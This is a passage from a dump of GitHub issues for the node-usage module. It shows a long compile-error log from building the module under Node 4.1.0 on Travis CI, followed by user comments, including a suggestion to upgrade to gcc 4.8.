                 from ../src/binding.cpp:2:
../node_modules/nan/nan_converters_43_inl.h:18:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Boolean&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:19:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Number&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:20:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:21:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Object&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:22:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Integer&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:23:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Uint32&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:24:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;v8::Int32&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:34:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;bool&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:35:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;double&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:36:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;long int&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:37:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;unsigned int&gt;&#8217; does not name a type
../node_modules/nan/nan_converters_43_inl.h:38:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::ToFactory&lt;int&gt;&#8217; does not name a type
In file included from ../node_modules/nan/nan.h:188:0,
                 from ../src/binding.cpp:2:
../node_modules/nan/nan_new.h: In function &#8216;v8::Local&lt;T&gt; Nan::imp::To(v8::Local&lt;v8::Integer&gt;) [with T = v8::Integer]&#8217;:
../node_modules/nan/nan_new.h:21:32: error: no matching function for call to &#8216;To(v8::Local&lt;v8::Integer&gt;&amp;)&#8217;
../node_modules/nan/nan_new.h:21:32: note: candidate is:
../node_modules/nan/nan_converters.h:53:38: note: template&lt;class T&gt; typename Nan::imp::ToFactory::return_t Nan::To(v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h: In function &#8216;v8::Local&lt;T&gt; Nan::imp::To(v8::Local&lt;v8::Integer&gt;) [with T = v8::Int32]&#8217;:
../node_modules/nan/nan_new.h:28:30: error: no matching function for call to &#8216;To(v8::Local&lt;v8::Integer&gt;&amp;)&#8217;
../node_modules/nan/nan_new.h:28:30: note: candidate is:
../node_modules/nan/nan_converters.h:53:38: note: template&lt;class T&gt; typename Nan::imp::ToFactory::return_t Nan::To(v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h: In function &#8216;v8::Local&lt;T&gt; Nan::imp::To(v8::Local&lt;v8::Integer&gt;) [with T = v8::Uint32]&#8217;:
../node_modules/nan/nan_new.h:35:31: error: no matching function for call to &#8216;To(v8::Local&lt;v8::Integer&gt;&amp;)&#8217;
../node_modules/nan/nan_new.h:35:31: note: candidate is:
../node_modules/nan/nan_converters.h:53:38: note: template&lt;class T&gt; typename Nan::imp::ToFactory::return_t Nan::To(v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h: At global scope:
../node_modules/nan/nan_new.h:43:11: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan_new.h:75:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:141:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:147:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:148:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:160:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:161:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:162:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:163:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:165:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:166:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:182:17: error: &#8216;return_t&#8217; does not name a type
../node_modules/nan/nan_new.h:183:17: error: &#8216;return_t&#8217; does not name a type
In file included from ../node_modules/nan/nan_new.h:189:0,
                 from ../node_modules/nan/nan.h:188,
                 from ../src/binding.cpp:2:
../node_modules/nan/nan_implementation_12_inl.h:56:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::Date&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h: In static member function &#8216;static Nan::imp::FactoryBase&lt;v8::Function&gt;::return_t Nan::imp::Factory&lt;v8::Function&gt;::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)&#8217;:
../node_modules/nan/nan_implementation_12_inl.h:90:46: error: &#8216;NewInstance&#8217; was not declared in this scope
../node_modules/nan/nan_implementation_12_inl.h: In static member function &#8216;static Nan::imp::FactoryBase&lt;v8::FunctionTemplate&gt;::return_t Nan::imp::Factory&lt;v8::FunctionTemplate&gt;::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, v8::Local&lt;v8::Signature&gt;)&#8217;:
../node_modules/nan/nan_implementation_12_inl.h:118:48: error: &#8216;NewInstance&#8217; was not declared in this scope
../node_modules/nan/nan_implementation_12_inl.h: At global scope:
../node_modules/nan/nan_implementation_12_inl.h:197:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::RegExp&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:216:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::Script&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:222:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::Script&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:254:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:262:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:268:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:275:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:281:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:286:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:347:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::UnboundScript&gt;&#8217; does not name a type
../node_modules/nan/nan_implementation_12_inl.h:354:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::UnboundScript&gt;&#8217; does not name a type
In file included from ../node_modules/nan/nan.h:188:0,
                 from ../src/binding.cpp:2:
../node_modules/nan/nan_new.h:291:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:297:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:303:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:309:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:315:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:321:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::String&gt;&#8217; does not name a type
../node_modules/nan/nan_new.h:327:1: error: &#8216;return_t&#8217; in &#8216;struct Nan::imp::Factory&lt;v8::RegExp&gt;&#8217; does not name a type
In file included from ../src/binding.cpp:2:0:
../node_modules/nan/nan.h: In function &#8216;v8::Local&lt;v8::Value&gt; Nan::Error(const char*)&#8217;:
../node_modules/nan/nan.h:639:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::ThrowError(const char*)&#8217;:
../node_modules/nan/nan.h:639:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;v8::Local&lt;v8::Value&gt; Nan::RangeError(const char*)&#8217;:
../node_modules/nan/nan.h:640:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::ThrowRangeError(const char*)&#8217;:
../node_modules/nan/nan.h:640:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;v8::Local&lt;v8::Value&gt; Nan::ReferenceError(const char*)&#8217;:
../node_modules/nan/nan.h:641:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::ThrowReferenceError(const char*)&#8217;:
../node_modules/nan/nan.h:641:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;v8::Local&lt;v8::Value&gt; Nan::SyntaxError(const char*)&#8217;:
../node_modules/nan/nan.h:642:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::ThrowSyntaxError(const char*)&#8217;:
../node_modules/nan/nan.h:642:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;v8::Local&lt;v8::Value&gt; Nan::TypeError(const char*)&#8217;:
../node_modules/nan/nan.h:643:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::ThrowTypeError(const char*)&#8217;:
../node_modules/nan/nan.h:643:3: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: At global scope:
../node_modules/nan/nan.h:651:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:673:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:689:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:702:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:719:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:725:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:733:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:740:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h:746:14: error: &#8216;MaybeLocal&#8217; does not name a type
../node_modules/nan/nan.h: In member function &#8216;void Nan::Callback::SetFunction(const v8::Local&lt;v8::Function&gt;&amp;)&#8217;:
../node_modules/nan/nan.h:1366:40: error: &#8216;Set&#8217; was not declared in this scope
../node_modules/nan/nan.h:1366:40: note: suggested alternative:
/home/travis/.node-gyp/4.1.0/include/node/v8.h:3021:17: note:   &#8216;v8::Set&#8217;
../node_modules/nan/nan.h: In member function &#8216;void Nan::AsyncWorker::SaveToPersistent(const char*, const v8::Local&lt;v8::Value&gt;&amp;)&#8217;:
../node_modules/nan/nan.h:1488:41: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In member function &#8216;v8::Local&lt;v8::Value&gt; Nan::AsyncWorker::GetFromPersistent(const char*) const&#8217;:
../node_modules/nan/nan.h:1506:45: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In member function &#8216;virtual void Nan::AsyncWorker::HandleErrorCallback()&#8217;:
../node_modules/nan/nan.h:1540:58: error: no matching function for call to &#8216;New(const char*)&#8217;
../node_modules/nan/nan.h:1540:58: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
../node_modules/nan/nan.h: In function &#8216;void Nan::SetMethod(const T&amp;, const char*, Nan::FunctionCallback)&#8217;:
../node_modules/nan/nan.h:1829:16: error: there are no arguments to &#8216;GetFunction&#8217; that depend on a template parameter, so a declaration of &#8216;GetFunction&#8217; must be available [-fpermissive]
../node_modules/nan/nan.h:1829:16: note: (if you use &#8216;-fpermissive&#8217;, G++ will accept your code, but allowing the use of an undeclared name is deprecated)
../node_modules/nan/nan.h:1830:45: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::SetPrototypeMethod(v8::Local&lt;v8::FunctionTemplate&gt;, const char*, Nan::FunctionCallback)&#8217;:
../node_modules/nan/nan.h:1842:32: error: &#8216;GetFunction&#8217; was not declared in this scope
../node_modules/nan/nan.h:1843:45: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In function &#8216;void Nan::SetAccessor(v8::Local&lt;v8::ObjectTemplate&gt;, v8::Local&lt;v8::String&gt;, Nan::GetterCallback, Nan::SetterCallback, v8::Local&lt;v8::Value&gt;, v8::AccessControl, v8::PropertyAttribute, Nan::imp::Sig)&#8217;:
../node_modules/nan/nan.h:1868:47: error: &#8216;NewInstance&#8217; was not declared in this scope
../node_modules/nan/nan.h: In function &#8216;bool Nan::SetAccessor(v8::Local&lt;v8::Object&gt;, v8::Local&lt;v8::String&gt;, Nan::GetterCallback, Nan::SetterCallback, v8::Local&lt;v8::Value&gt;, v8::AccessControl, v8::PropertyAttribute)&#8217;:
../node_modules/nan/nan.h:1911:51: error: &#8216;NewInstance&#8217; was not declared in this scope
../node_modules/nan/nan.h: In function &#8216;void Nan::SetNamedPropertyHandler(v8::Local&lt;v8::ObjectTemplate&gt;, Nan::PropertyGetterCallback, Nan::PropertySetterCallback, Nan::PropertyQueryCallback, Nan::PropertyDeleterCallback, Nan::PropertyEnumeratorCallback, v8::Local&lt;v8::Value&gt;)&#8217;:
../node_modules/nan/nan.h:1959:47: error: &#8216;NewInstance&#8217; was not declared in this scope
../node_modules/nan/nan.h: In function &#8216;void Nan::SetIndexedPropertyHandler(v8::Local&lt;v8::ObjectTemplate&gt;, Nan::IndexGetterCallback, Nan::IndexSetterCallback, Nan::IndexQueryCallback, Nan::IndexDeleterCallback, Nan::IndexEnumeratorCallback, v8::Local&lt;v8::Value&gt;)&#8217;:
../node_modules/nan/nan.h:2029:47: error: &#8216;NewInstance&#8217; was not declared in this scope
In file included from ../src/binding.cpp:2:0:
../node_modules/nan/nan.h: In function &#8216;void Nan::Export(Nan::ADDON_REGISTER_FUNCTION_ARGS_TYPE, const char*, Nan::FunctionCallback)&#8217;:
../node_modules/nan/nan.h:2090:35: error: no matching function for call to &#8216;New(const char*&amp;)&#8217;
../node_modules/nan/nan.h:2090:35: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
../node_modules/nan/nan.h:2091:47: error: &#8216;GetFunction&#8217; was not declared in this scope
../node_modules/nan/nan.h:2091:65: error: &#8216;Set&#8217; was not declared in this scope
../node_modules/nan/nan.h:2091:65: note: suggested alternative:
/home/travis/.node-gyp/4.1.0/include/node/v8.h:3021:17: note:   &#8216;v8::Set&#8217;
../node_modules/nan/nan.h: In constructor &#8216;Nan::Tap::Tap(v8::Local&lt;v8::Value&gt;)&#8217;:
../node_modules/nan/nan.h:2098:30: error: no matching function for call to &#8216;To(v8::Local&lt;v8::Value&gt;&amp;)&#8217;
../node_modules/nan/nan.h:2098:30: note: candidate is:
../node_modules/nan/nan_converters.h:53:38: note: template&lt;class T&gt; typename Nan::imp::ToFactory::return_t Nan::To(v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan.h: In member function &#8216;void Nan::Tap::ok(bool, const char*)&#8217;:
../node_modules/nan/nan.h:2111:33: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../node_modules/nan/nan.h: In member function &#8216;void Nan::Tap::pass(const char*)&#8217;:
../node_modules/nan/nan.h:2117:30: error: &#8216;Nan::imp::FactoryBase&lt;v8::Boolean&gt;::return_t&#8217; has no member named &#8216;ToLocalChecked&#8217;
../src/binding.cpp: In function &#8216;void RegisterModule(v8::Local&lt;v8::Object&gt;)&#8217;:
../src/binding.cpp:8:40: error: no matching function for call to &#8216;New(const char [6])&#8217;
../src/binding.cpp:8:40: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
../src/binding.cpp:9:44: error: no matching function for call to &#8216;New(const char [10])&#8217;
../src/binding.cpp:9:44: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
../src/binding.cpp:16:37: error: no matching function for call to &#8216;New(const char [3])&#8217;
../src/binding.cpp:16:37: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
../src/binding.cpp:16:76: error: no matching function for call to &#8216;New(const char [6])&#8217;
../src/binding.cpp:16:76: note: candidates are:
../node_modules/nan/nan_implementation_12_inl.h:390:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const v8::Persistent&lt;S, M&gt;&amp;)
../node_modules/nan/nan_implementation_12_inl.h:395:21: note: template&lt;class T, class M&gt; v8::Local&lt;T&gt; Nan::New(const Nan::Persistent&lt;T, M&gt;&amp;)
../node_modules/nan/nan_new.h:201:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New()
../node_modules/nan/nan_new.h:207:1: note: template&lt;class T, class A0&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0)
../node_modules/nan/nan_new.h:213:1: note: template&lt;class T, class A0, class A1&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1)
../node_modules/nan/nan_new.h:219:1: note: template&lt;class T, class A0, class A1, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2)
../node_modules/nan/nan_new.h:225:1: note: template&lt;class T, class A0, class A1, class A2, class A3&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(A0, A1, A2, A3)
../node_modules/nan/nan_new.h:237:1: note: template&lt;class T&gt; typename Nan::imp::Factory::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;)
../node_modules/nan/nan_new.h:245:1: note: template&lt;class T, class A2&gt; typename Nan::imp::Factory&lt;T&gt;::return_t Nan::New(Nan::FunctionCallback, v8::Local&lt;v8::Value&gt;, A2)
make: *** [Release/obj.target/sysinfo/src/binding.o] Error 1
make: Leaving directory `/home/travis/build/uditalias/swamp/node_modules/usage/build'
gyp ERR! build error 
gyp ERR! stack Error: `make` failed with exit code: 2
gyp ERR! stack     at ChildProcess.onExit (/home/travis/.nvm/versions/node/v4.1.0/lib/node_modules/npm/node_modules/node-gyp/lib/build.js:270:23)
gyp ERR! stack     at emitTwo (events.js:87:13)
gyp ERR! stack     at ChildProcess.emit (events.js:172:7)
gyp ERR! stack     at Process.ChildProcess._handle.onexit (internal/child_process.js:200:12)
gyp ERR! System Linux 2.6.32-042stab090.5
gyp ERR! command "/home/travis/.nvm/versions/node/v4.1.0/bin/node" "/home/travis/.nvm/versions/node/v4.1.0/lib/node_modules/npm/node_modules/node-gyp/bin/node-gyp.js" "rebuild"
gyp ERR! cwd /home/travis/build/uditalias/swamp/node_modules/usage
gyp ERR! node -v v4.1.0
gyp ERR! node-gyp -v v3.0.3
gyp ERR! not ok 
```

Any clues or ideas?
</Body>
    <State>open</State>
    <Comment>
      <Owner>tim-kos</Owner>
      <Body>+1

The module is broken in Node 4.1.x
</Body>
    </Comment>
    <Comment>
      <Owner>tim-kos</Owner>
      <Body>Is there any update for this?
</Body>
    </Comment>
    <Comment>
      <Owner>alonisser</Owner>
      <Body>I found up this happens when gcc version is under 4.8 . (for example in ubuntu 12.04 LTS as used in travis ci, circle ci etc) so can be solved with:

``` bash
sudo apt-get install -qq python-software-properties
sudo add-apt-repository -qq ppa:ubuntu-toolchain-r/test
sudo apt-get update
sudo apt-get install -qq gcc-4.8 g++-4.8
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 60 --slave /usr/bin/g++ g++ /usr/bin/g++-4.8
```
</Body>
    </Comment>
    <Comment>
      <Owner>pmverma</Owner>
      <Body>Not working with any of 4.x.x.
Any plan to update?
</Body>
    </Comment>
  </Issue_277>
  <Issue_278>
    <Repository>node-usage</Repository>
    <Title>CPU counts only on parent process, not child</Title>
    <Owner>arunoda</Owner>
    <Body>![csgo](https://cloud.githubusercontent.com/assets/6473565/8271550/74cda002-1826-11e5-9927-6d10e9bf7801.png)
